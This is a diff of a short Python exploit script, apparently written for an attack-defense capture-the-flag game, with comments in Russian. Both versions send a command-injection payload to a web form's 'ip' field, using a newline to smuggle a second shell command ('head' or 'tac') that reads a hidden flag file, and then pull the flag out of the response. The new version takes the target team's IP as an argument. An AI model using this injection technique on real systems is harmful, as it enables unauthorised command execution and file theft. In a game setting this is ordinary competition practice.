@@ -1,17 +1,22 @@
-import requests
-import re
+#!/usr/bin/env python3
+import urllib.request
+import urllib.parse
+import sys
 
-TARGET_URL = "http://10.24.249.158:5000"
+# Получаем IP команды из аргументов
+team_ip = sys.argv[1] if len(sys.argv) > 1 else "10.24.249.158"
 
-payload = "127.0.0.1\nhead .hidden/.flag"
+url = f"http://{team_ip}:5000/"
+data = 'ip=1.1.1.1%0A tac .hidden/.flag'.encode()
 
-response = requests.post(TARGET_URL, data={"ip": payload})
+req = urllib.request.Request(url, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
+response = urllib.request.urlopen(req)
+html = response.read().decode()
 
-flag_match = re.search(r'flag\{[^{}]*\}', response.text)
-
-if flag_match:
-    print("[+] Флаг найден:", flag_match.group(0))
+if 'flag{' in html:
+    flag_start = html.find('flag{')
+    flag_end = html.find('}', flag_start) + 1
+    flag = html[flag_start:flag_end]
+    print(flag, flush=True)
 else:
-    print("[-] Флаг не найден. Попробуйте другие команды.")
-    print("\nОтвет сервера:")
-    print(response.text[-500:])
+    print("Флаг не найден", flush=True)
